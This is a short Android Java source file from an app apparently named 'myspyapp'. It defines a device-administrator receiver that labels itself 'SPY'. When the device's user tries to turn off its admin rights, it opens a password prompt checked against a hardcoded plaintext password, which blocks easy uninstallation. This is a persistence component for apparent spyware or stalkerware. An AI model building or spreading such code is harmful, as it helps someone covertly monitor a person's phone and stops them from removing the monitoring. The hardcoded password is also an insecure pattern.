package com.mycompany.myspyapp; // Replace with your actual package name

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String ADMIN_PASSWORD = "Rajaroy"; // Replace with your actual password

    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "Device Admin enabled for SPY", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Toast.makeText(context, "Device Admin disabled for SPY", Toast.LENGTH_SHORT).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Launch an Activity to prompt for a password
        Intent passwordIntent = new Intent();
        passwordIntent.setClassName(context.getPackageName(), context.getPackageName() + ".DisableAdminPasswordActivity");
        passwordIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(passwordIntent);
        // Return a message to the user (optional, as the Activity will handle the flow)
        return "Enter the password to disable Device Admin for SPY.";
    }

    public static boolean checkPassword(String enteredPassword) {
        return ADMIN_PASSWORD.equals(enteredPassword);
    }
}
